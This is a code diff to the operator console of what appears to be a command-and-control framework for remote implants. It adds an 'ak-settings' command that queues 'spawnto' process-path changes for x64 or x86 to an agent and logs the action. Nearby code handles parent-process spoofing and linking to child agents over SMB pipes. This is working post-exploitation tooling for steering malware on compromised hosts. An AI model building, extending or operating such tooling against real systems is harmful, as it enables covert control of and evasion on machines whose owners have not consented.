@@ -570,6 +570,39 @@ class OperatorShell:
                 console.print("[green]Task queued: ppid (show current)[/green]")
             return
 
+        # ak-settings — operator-friendly settings alias
+        # Format: ak-settings spawnto_x64 <path>
+        #         ak-settings spawnto_x86 <path>
+        if cmd == "ak-settings":
+            if not args:
+                console.print(
+                    "[yellow]Usage:[/yellow]\n"
+                    "  ak-settings spawnto_x64 <path>\n"
+                    "  ak-settings spawnto_x86 <path>"
+                )
+                return
+            setting = args[0].lower()
+            if setting in ("spawnto_x64", "spawnto_x86"):
+                if len(args) < 2:
+                    console.print(f"[red]Missing path for {args[0]}[/red]")
+                    return
+                arch = "x64" if "x64" in setting else "x86"
+                path = " ".join(args[1:])
+                argstr = f"{arch} {path}"
+                self.task_manager.create_task(
+                    agent, TaskType.NATIVE, "spawnto",
+                    arguments=argstr.encode("utf-8"),
+                )
+                self.logger.log_command(
+                    agent.agent_id, agent.hostname, agent.username,
+                    "ak-settings", {"setting": setting, "value": path},
+                )
+                console.print(f"[green]Task queued: spawnto {argstr}[/green]")
+            else:
+                console.print(f"[red]Unknown setting: {args[0]}[/red]\n"
+                              "[dim]Available: spawnto_x64, spawnto_x86[/dim]")
+            return
+
         # link — connect to child agent's SMB pipe
         if cmd == "link":
             if len(args) < 2:
